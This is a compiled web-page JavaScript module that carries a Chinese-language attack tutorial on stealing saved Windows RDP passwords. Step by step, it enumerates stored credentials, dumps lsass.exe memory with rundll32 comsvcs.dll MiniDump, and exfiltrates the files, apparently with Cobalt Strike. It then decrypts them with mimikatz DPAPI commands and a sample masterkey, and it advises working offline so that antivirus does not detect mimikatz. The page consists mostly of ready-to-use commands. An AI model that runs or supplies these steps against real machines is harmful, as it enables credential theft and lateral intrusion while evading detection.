import{_ as a,W as s,X as e,a1 as n}from"./framework-b6a07282.js";const i="/assets/1-c5a3ef07.jpg",t="/assets/5-574ca915.jpg",l="/assets/6-3011abfd.jpg",d="/assets/7-434c37d9.jpg",c="/assets/2-f8c2b8aa.jpg",r="/assets/3-111a89a0.jpg",o="/assets/4-90c8a251.jpg",u={},p=n(`<h2 id="rdp密码获取" tabindex="-1"><a class="header-anchor" href="#rdp密码获取" aria-hidden="true">#</a> RDP密码获取</h2><ul><li>RDP就是远程桌面，当有人保留了远程桌面的凭证时可通过Credentials的解密来获取保留再本地的远程桌面的账号密码。</li></ul><h3 id="查看保留在本地的凭证" tabindex="-1"><a class="header-anchor" href="#查看保留在本地的凭证" aria-hidden="true">#</a> 查看保留在本地的凭证</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.查看mstsc的连接记录
cmdkey /list
2.查找本地的Credentials
dir /a %userprofile%\\appdata\\local\\microsoft\\credentials\\*
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+i+`"><h3 id="离线破解" tabindex="-1"><a class="header-anchor" href="#离线破解" aria-hidden="true">#</a> 离线破解</h3><ul><li>由于我们不能保证我们的mimikatz是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目 的其实很简单，就是把目标的文件和内存下载回来，在vps或本机上进行mimikatz解密即可。</li></ul><ol><li>从目标机上下载lsass.exe（抓取Windos密码这篇有4种方式）</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. 首先查看lsass.exe进程PID:
tasklist | findstr lsass.exe

2.使用powershell导出
rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 508 C:\\lsass1.dmp full
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>下载目标机上的Credentials文件</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.查找路径
<span class="token function">dir</span> /a %userprofile%<span class="token punctuation">\\</span>appdata<span class="token punctuation">\\</span>local<span class="token punctuation">\\</span>microsoft<span class="token punctuation">\\</span>credentials<span class="token punctuation">\\</span>*

C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>appdata<span class="token punctuation">\\</span>local<span class="token punctuation">\\</span>microsoft<span class="token punctuation">\\</span>credentials<span class="token punctuation">\\</span>08202FB4EA58B689B10DBC82AC8879D4
用cs搞下来
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>用mimikatz载入dump回来的内存</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Sekurlsa::minidump lsass1.dmp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="4"><li>获取Credentials的GUID</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dpapi::cred /in:08202FB4EA58B689B10DBC82AC8879D4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+t+`"><ol start="5"><li>获取lsass.dmp内存中所有的MasterKey</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sekurlsa::dpapi
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+l+`"><ol start="6"><li>利用MasterKey解密</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dpapi::cred /in:08202FB4EA58B689B10DBC82AC8879D4 /masterkey:ec45f4c6fa5aabf1c5b5a7caab823197aaec8a382a96cd6a7b7334d00f6d481c70e5ace0cbc29451b1594f69220c1b4649e9a8bed85a2b6c5d99dd08aa805e6c
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+d+`"><h3 id="在线破解" tabindex="-1"><a class="header-anchor" href="#在线破解" aria-hidden="true">#</a> 在线破解</h3><ol><li>使用mimikatz获取该文件的guidMasterKey</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>mimikatz dpapi::cred /in:C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>appdata<span class="token punctuation">\\</span>local<span class="token punctuation">\\</span>microsoft<span class="token punctuation">\\</span>credentials<span class="token punctuation">\\</span>08202FB4EA58B689B10DBC82AC8879D4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+c+`"><ol start="2"><li>在内存中找到对应guidMasterKey的MasterKey</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>mimikatz sekurlsa::dpapi
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+r+`"><ol start="3"><li>使用mimikatz通过MasterKey值去解密凭据文件</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>mimikatz dpapi::cred /in:C:\\Users\\fish1\\AppData\\Local\\Microsoft\\Credentials\\08202FB4EA58B689B10DBC82AC8879D4 /masterkey:ec45f4c6fa5aabf1c5b5a7caab823197aaec8a382a96cd6a7b7334d00f6d481c70e5ace0cbc29451b1594f69220c1b4649e9a8bed85a2b6c5d99dd08aa805e6c
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+o+'">',32),m=[p];function v(b,g){return s(),e("div",null,m)}const k=a(u,[["render",v],["__file","RDP密码获取.html.vue"]]);export{k as default};
